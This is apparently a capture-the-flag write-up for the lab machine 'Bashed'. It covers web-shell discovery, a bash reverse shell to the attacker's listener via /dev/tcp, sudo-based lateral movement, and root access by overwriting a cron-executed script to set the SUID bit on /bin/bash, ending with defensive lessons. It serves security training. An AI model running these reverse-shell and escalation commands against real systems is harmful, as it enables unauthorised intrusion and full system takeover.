# Bashed

**Difficulty:** Easy | **OS:** Linux | **IP:** `10.10.10.68`

## Summary
**Bashed** is an easy-difficulty Linux machine centered around a publicly accessible web development directory containing a web shell interface (`phpbash`). Initial access is obtained by navigating to a exposed development endpoint (`/dev/phpbash.php`) which provides an interactive web console. Privilege escalation involves pivoting to the `scriptmanager` service account via custom `sudo` permissions (`NOPASSWD: ALL`), followed by abusing a cron job executing as root that runs a Python script located within a directory writable by `scriptmanager`.

## Reconnaissance

### Port Scanning (Nmap)
We begin by scanning open TCP ports on the target host:

- **80**: http (Apache httpd 2.4.18)

### Web Enumeration & Directory Discovery
Inspecting the web application reveals a blog post discussing a custom web shell project called **phpbash**, along with a link to a GitHub repository.

We perform directory brute-forcing to discover hidden paths:

- _/about.html_ — About page mentioning user developer names.
- _/contact.html_ — Contact form (tested for XSS/CSRF triggers with no back-connect received).
- _/php/_ — Directory listing containing PHP utility files.
- _/dev/_ — Exposed development folder containing phpbash.php.

Direct access to `/dev/phpbash.php` renders a functional web-based shell interface running under the context of the `www-data` web server account.

## Exploitation (User Flag)

### Establishing a Reverse Shell

To obtain a stable terminal environment from the web interface, we execute a reverse shell command directed at our listener:

```bash -c "bash -i >& /dev/tcp/10.10.15.97/443 0>&1"```

We stabilize the interactive TTY session:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
reset xterm
```

With shell stability established, we read the `user.txt` flag located in `/home/arrexel/user.txt`.

## Privilege Escalation (Root Flag)

### Lateral Movement (www-data to scriptmanager)

We inspect execution rights assigned to `www-data` using `sudo -l`:

```
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

This configuration permits executing any command as the scriptmanager user without requiring a password. We spawn a shell under `scriptmanager`:

```sudo -u scriptmanager bash```

### Analyzing Privileged Cron Tasks

Enumerating local resources owned by `scriptmanager`:

```find / -user scriptmanager 2>/dev/null```

We discover a folder named `/scripts` at the root directory containing two files:

- `test.py` — Owned by `scriptmanager`.
- `test.txt` — Owned by `root`.

`test.py` contains basic file-writing instructions:

```
f = open("test.txt", "w")
f.write("testing 123!")
f.close()
```

Because `test.txt` is continually updated with `root` ownership, an automated task or cron job running under the `root` context periodically executes scripts inside `/scripts/`.

### Abusing Script Execution for Root Access

Since `scriptmanager` owns `test.py`, we overwrite its content to execute a command that sets the SUID bit on `/bin/bash`:

```
import os
os.system("chmod u+s /bin/bash")
```

After waiting for the background scheduled task to execute `test.py`:

```
ls -la /bin/bash
# -rwsr-xr-x 1 root root ... /bin/bash
bash -p
```
We obtain full `root` privileges and capture `root.txt`.

## Conclusions & Key Lessons
- **Insecure Storage of Administrative Tools:** Web shells or debugging utilities (`phpbash`) should never be hosted or exposed within publicly accessible web directories.
- **Over-privileged Sudo Permissions:** Granting `NOPASSWD: ALL` to service accounts increases the internal attack surface during lateral movement.
- **Insecure File Ownership in Automated Tasks:** Cron jobs executing as `root` must not run scripts located in directories owned by or writable by non-root users.
